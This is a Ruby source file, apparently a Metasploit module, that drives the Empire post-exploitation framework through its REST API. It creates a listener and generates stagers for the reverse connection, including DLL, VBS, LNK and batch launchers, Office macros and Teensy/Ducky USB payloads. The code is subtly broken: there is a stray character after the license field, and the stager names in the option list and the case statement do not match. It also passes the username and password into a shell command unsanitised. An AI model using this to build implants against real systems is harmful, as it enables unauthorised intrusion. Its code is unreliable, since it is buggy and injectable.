# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see theMetasploit
# web site for more information on licensing and terms of use.
# http://metasploit.com/
require 'msf/core/module/data_store'
require 'msf/core/module/options'
require 'msf/core/empire_lib.rb'

module MetasploitModule
  include Msf::Empire
  include Msf::Module::Options
  include Msf::Module::DataStore
  def initialize(info={})
    super(merge_info(info,
    'Name'       => 'Empire Stager Module',
    'Description'=> 'This creates a standalone stager for Empire using the Rest-API',
    'Author'     => ['author_name'],
    'License'    => MSF_LICENSE,-
    'Platform'   => ['Windows', 'Linux', 'MacOS']
    #'Handler'    => Msf::Handler::EmpireShimHandler
    ))
    register_options(
      [OptAddress.new(
        'LHOST',
        [true,
        'The local address to lisen on'
        ]),
      OptPort.new(
        'LPORT',
        [true,
        'The local port to listen on'
        ]),
      OptString.new(
        'ListenerName',
        [true,
        'The empire listener name that would listen for the created stager on the local system',
        ]),
      OptString.new(
        'USERNAME',
        [true,
        'The empire username you want to use for this session',
        'empire_user']),
      OptString.new(
        'PASSWORD',
        [true,
        'The empire password you want for this session',
        'empire_pass']),
      OptEnum.new(
        'StagerType',
        [true,
        'The type of stager to be generated',
        enums: ['windows/dll', 'windows/ducky', 'windows/launcher_sct', 'windows/laucher_vbs', 'windows/launcher_xml', 'windows/teensy', 'windows/launcher_bat', 'windows/launcher_lnk', 'windows/macro' ]]),
      OptString.new(
        'PathToEmpire',
        [true,
        'The complete path to Empire-WEB API',
        '/'])
    ])
  end
  def payload_name(stager)
    @rand_no = rand(1..10000)
    case stager
      when "windows/dll"
        return "/tmp/launcher#{@rand_no}.dll"
      when "windows/launcher_bat"
        return "/tmp/launcher#{@rand_no}.bat"
      when "windows/launcher_vbs"
        return "/tmp/launcher#{@rand_no}.vbs"
      when "windows/launcher_sct"
        return "/tmp/launcher#{@rand_no}.sct"
      when "windows/launcher_lnk"
        return "/tmp/launcher#{@rand_no}.lnk"
      when "windows/launcher_xml"
        return "/tmp/launcher#{@rand_no}.xml"
      when "windows/teensy"
        return "/tmp/launcher#{@rand_no}.ino"
      when "windows/macro"
        return "/tmp/macro#{@rand_no}.txt"
      when "multi/pyinstaller"
        return "/tmp/launcher#{@rand_no}.elf"
      when "multi/war"
        return "/tmp/launcher#{@rand_no}.war"
    end
  end
  def generate
    #
    #Storing data from user
    #
    port = datastore['LPORT'].to_s
    user_name = datastore['USERNAME'].to_s
    user_pass = datastore['PASSWORD'].to_s
    listener_name = datastore['ListenerName'].to_s
    stager_type = datastore['StagerType'].to_s
    path = datastore['PathToEmpire'].to_s
    command = "cd #{path}  && ./empire --headless " "--username \"" + user_name +"\" --password \"" + user_pass + "\" > /dev/null"
    #
    #Initiating the Empire API Instance thread with provided username and password
    #
    print_status("Initiating Empire Web-API")
    server = Thread.new{
      value = system(command)
    }
    #
    #Creating an Empire object
    #
    client = Msf::Empire::Client.new(user_name, user_pass)
    #
    #Checking if listener aleady exists
    #
    if client.is_listener_active(listener_name) == false
      response = client.create_listener(listener_name, port)
      raise response.to_s if response.to_s.include?("Failed")
      print_status(response.to_s)
      #Creating the stager
      payload_path = payload_name(stager_type)
      print_status(client.gen_stager(listener_name, stager_type, payload_path))
    else
      print_status(client.is_listener_active(listener_name))
    end
    #
    #Shutting down API
    #
    client.shutdown
    #Showing user the respective listener to use while for handling reverse connection
    #
    print_status("Use Listener:#{listener_name} to listen for the created stager")
    #
    #Terminating the thread
    #
    server.terminate
  end
end
